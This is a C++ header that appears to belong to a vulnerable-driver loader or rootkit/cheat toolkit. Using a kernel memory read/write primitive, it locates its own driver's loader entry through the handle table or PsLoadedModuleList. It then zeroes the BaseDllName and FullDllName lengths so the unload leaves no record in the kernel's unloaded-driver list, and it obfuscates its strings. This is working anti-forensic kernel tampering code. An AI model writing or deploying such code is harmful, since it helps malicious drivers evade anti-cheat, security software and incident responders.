#pragma once
#include <algorithm>
#include <vector>

namespace cleanup {
namespace mm {

#pragma pack(push, 8)
struct system_handle_table_entry_info_ex_t {
    void*          object;
    std::uintptr_t unique_process_id;
    std::uintptr_t handle_value;
    std::uint32_t  granted_access;
    std::uint16_t  creator_back_trace_index;
    std::uint16_t  object_type_index;
    std::uint32_t  handle_attributes;
    std::uint32_t  reserved;
};

struct system_handle_information_ex_t {
    std::uintptr_t number_of_handles;
    std::uintptr_t reserved;
    system_handle_table_entry_info_ex_t handles[ 1 ];
};
#pragma pack(pop)

inline bool zero_us_length( std::uint64_t name_va ) {
    const std::uint16_t zero = 0;
    return g_paging->write_virtual_memory( name_va, &zero, sizeof( zero ) );
}

inline bool prep_via_device_handle( ) {
    if ( !g_driver || !g_paging || !g_pdb )
        return false;

    const auto h = g_driver->get_handle( );
    if ( !h || h == INVALID_HANDLE_VALUE )
        return false;

    ULONG need = 0x10000;
    auto st = NtQuerySystemInformation(
        static_cast<SYSTEM_INFORMATION_CLASS>( 64 ),
        nullptr, 0, &need );

    if ( st != static_cast<NTSTATUS>( 0xC0000004L ) && need == 0 )
        return false;

    std::vector< std::uint8_t > buf;
    for ( int attempt = 0; attempt < 10; ++attempt ) {
        if ( need < 0x10000 )
            need = 0x10000;

        if ( need > 64u * 1024u * 1024u )
            need = 64u * 1024u * 1024u;
        buf.resize( need );
        st = NtQuerySystemInformation(
            static_cast<SYSTEM_INFORMATION_CLASS>( 64 ),
            buf.data( ), need, &need );
        if ( st == 0 )
            break;
        if ( st != static_cast<NTSTATUS>( 0xC0000004L ) )
            return false;
        need += 0x10000;
    }
    if ( st != 0 || buf.size( ) < sizeof( system_handle_information_ex_t ) )
        return false;

    const auto* info = reinterpret_cast<const system_handle_information_ex_t*>( buf.data( ) );
    const auto pid = static_cast<std::uintptr_t>( GetCurrentProcessId( ) );
    const auto hv = static_cast<std::uintptr_t>( reinterpret_cast<std::uintptr_t>( h ) );

    constexpr auto k_hdr = sizeof( std::uintptr_t ) * 2;
    if ( buf.size( ) <= k_hdr )
        return false;
    const auto max_by_buf = ( buf.size( ) - k_hdr ) / sizeof( system_handle_table_entry_info_ex_t );
    const auto count = info->number_of_handles;
    const auto max_h = ( std::min )( count, max_by_buf );

    std::uint64_t file_object = 0;
    for ( std::uintptr_t i = 0; i < max_h; ++i ) {
        const auto& e = info->handles[ i ];
        if ( e.unique_process_id != pid )
            continue;

        if ( e.handle_value != hv &&
             ( e.handle_value & 0xFFFFFFFFu ) != ( hv & 0xFFFFFFFFu ) )
            continue;
        file_object = reinterpret_cast<std::uint64_t>( e.object );
        break;
    }

    if ( !file_object || !kernel_va_plausible( file_object ) ) {
        logging::print( oxorany( "cleanup/mm: EBIoDispatch object not found - try list walk" ) );
        return false;
    }

    std::uint64_t device_object = 0;
    if ( !g_paging->read_virtual_memory( file_object + 0x8, &device_object, sizeof( device_object ) ) ||
         !kernel_va_plausible( device_object ) )
        return false;

    std::uint64_t driver_object = 0;
    if ( !g_paging->read_virtual_memory( device_object + 0x8, &driver_object, sizeof( driver_object ) ) ||
         !kernel_va_plausible( driver_object ) )
        return false;

    auto section_off = g_pdb->get_struct_member( oxorany( "_DRIVER_OBJECT" ), oxorany( "DriverSection" ) );
    if ( !section_off )
        section_off = 0x28;

    std::uint64_t driver_section = 0;
    if ( !g_paging->read_virtual_memory( driver_object + section_off, &driver_section, sizeof( driver_section ) ) ||
         !kernel_va_plausible( driver_section ) )
        return false;

    auto basedll_off = g_pdb->get_struct_member( oxorany( "_KLDR_DATA_TABLE_ENTRY" ), oxorany( "BaseDllName" ) );
    if ( !basedll_off )
        basedll_off = g_pdb->get_struct_member( oxorany( "_LDR_DATA_TABLE_ENTRY" ), oxorany( "BaseDllName" ) );
    if ( !basedll_off )
        basedll_off = 0x58;

    auto fulldll_off = g_pdb->get_struct_member( oxorany( "_KLDR_DATA_TABLE_ENTRY" ), oxorany( "FullDllName" ) );
    if ( !fulldll_off )
        fulldll_off = g_pdb->get_struct_member( oxorany( "_LDR_DATA_TABLE_ENTRY" ), oxorany( "FullDllName" ) );

    const auto name_va = driver_section + basedll_off;
    std::uint16_t name_len = 0;
    std::uint16_t name_max = 0;
    std::uint64_t name_buf = 0;
    if ( !g_paging->read_virtual_memory( name_va, &name_len, sizeof( name_len ) ) ||
         !g_paging->read_virtual_memory( name_va + 2, &name_max, sizeof( name_max ) ) ||
         !g_paging->read_virtual_memory( name_va + 8, &name_buf, sizeof( name_buf ) ) )
        return false;

    if ( name_len == 0 || name_len > 512 || ( name_len & 1 ) ||
         name_max < name_len || !name_buf || !kernel_va_plausible( name_buf ) ) {
        logging::print( oxorany( "cleanup/mm: BaseDllName invalid (len=%u) - skip device path" ), name_len );
        return false;
    }

    {
        wchar_t nm[ 128 ]{};
        const auto chars = ( std::min )( static_cast<std::size_t>( name_len / 2 ), std::size_t{ 120 } );
        if ( g_paging->read_virtual_memory( name_buf, nm, chars * sizeof( wchar_t ) ) ) {
            nm[ chars ] = 0;

            logging::print( oxorany( "cleanup/mm: device path name=%ls" ), nm );
        }
    }

    if ( !zero_us_length( name_va ) )
        return false;

    if ( fulldll_off ) {
        std::uint16_t fl = 0;
        if ( g_paging->read_virtual_memory( driver_section + fulldll_off, &fl, sizeof( fl ) ) &&
             fl > 0 && fl <= 1024 && !( fl & 1 ) )
            zero_us_length( driver_section + fulldll_off );
    }

    logging::print( oxorany( "cleanup/mm: BaseDllName.Length=0 via DriverSection (EBIoDispatch)" ) );
    return true;
}

inline bool prep_via_module_list( const context_t& ctx ) {
    if ( !ctx.service_name[ 0 ] || !g_paging || !g_pdb )
        return false;

    const auto list_head = g_pdb->get_symbol_address( oxorany( "PsLoadedModuleList" ) );
    if ( !list_head || !kernel_va_plausible( list_head ) )
        return false;

    auto basedll_off = g_pdb->get_struct_member( oxorany( "_KLDR_DATA_TABLE_ENTRY" ), oxorany( "BaseDllName" ) );
    auto fulldll_off = g_pdb->get_struct_member( oxorany( "_KLDR_DATA_TABLE_ENTRY" ), oxorany( "FullDllName" ) );
    if ( !basedll_off )
        basedll_off = g_pdb->get_struct_member( oxorany( "_LDR_DATA_TABLE_ENTRY" ), oxorany( "BaseDllName" ) );
    if ( !fulldll_off )
        fulldll_off = g_pdb->get_struct_member( oxorany( "_LDR_DATA_TABLE_ENTRY" ), oxorany( "FullDllName" ) );

    if ( !basedll_off ) {
        logging::print( oxorany( "cleanup/mm: BaseDllName PDB miss - skip list walk" ) );
        return false;
    }

    LIST_ENTRY head{};
    if ( !g_paging->read_virtual_memory( list_head, &head, sizeof( head ) ) )
        return false;

    auto flink = reinterpret_cast<std::uint64_t>( head.Flink );
    const auto start = list_head;
    int guard = 0;

    wchar_t target[ 64 ]{};
    wcsncpy_s( target, ctx.service_name, _TRUNCATE );
    wchar_t target_log[ 80 ]{};
    _snwprintf_s( target_log, _TRUNCATE, L"%s.log", ctx.service_name );

    while ( flink && flink != start && guard++ < 512 ) {
        if ( !kernel_va_plausible( flink ) )
            break;

        std::uint16_t name_len = 0;
        std::uint64_t name_buf = 0;
        const auto name_va = flink + basedll_off;
        if ( !g_paging->read_virtual_memory( name_va, &name_len, sizeof( name_len ) ) )
            break;
        if ( !g_paging->read_virtual_memory( name_va + 8, &name_buf, sizeof( name_buf ) ) )
            break;

        if ( name_len && name_len < 256 && !( name_len & 1 ) && name_buf && kernel_va_plausible( name_buf ) ) {
            wchar_t name[ 128 ]{};
            const auto chars = ( std::min )( static_cast<std::size_t>( name_len / 2 ), std::size_t{ 120 } );
            if ( g_paging->read_virtual_memory( name_buf, name, chars * sizeof( wchar_t ) ) ) {
                name[ chars ] = 0;
                if ( !_wcsicmp( name, target ) || !_wcsicmp( name, target_log ) ) {
                    if ( !zero_us_length( name_va ) )
                        return false;
                    if ( fulldll_off ) {
                        std::uint16_t fl = 0;
                        if ( g_paging->read_virtual_memory( flink + fulldll_off, &fl, sizeof( fl ) ) &&
                             fl > 0 && fl <= 1024 && !( fl & 1 ) )
                            zero_us_length( flink + fulldll_off );
                    }
                    logging::print( oxorany( "cleanup/mm: BaseDllName.Length=0 for %ls (list walk)" ), name );
                    return true;
                }
            }
        }

        LIST_ENTRY entry{};
        if ( !g_paging->read_virtual_memory( flink, &entry, sizeof( entry ) ) )
            break;
        flink = reinterpret_cast<std::uint64_t>( entry.Flink );
    }

    logging::print( oxorany( "cleanup/mm: module not found - skip (Mm residual possible)" ) );
    return false;
}

inline bool prep_skip_unload_record( const context_t& ctx ) {
    if ( !g_paging || !g_pdb )
        return false;

    if ( prep_via_device_handle( ) )
        return true;

    logging::print( oxorany( "cleanup/mm: device path failed - try module list" ) );
    return prep_via_module_list( ctx );
}

}
}
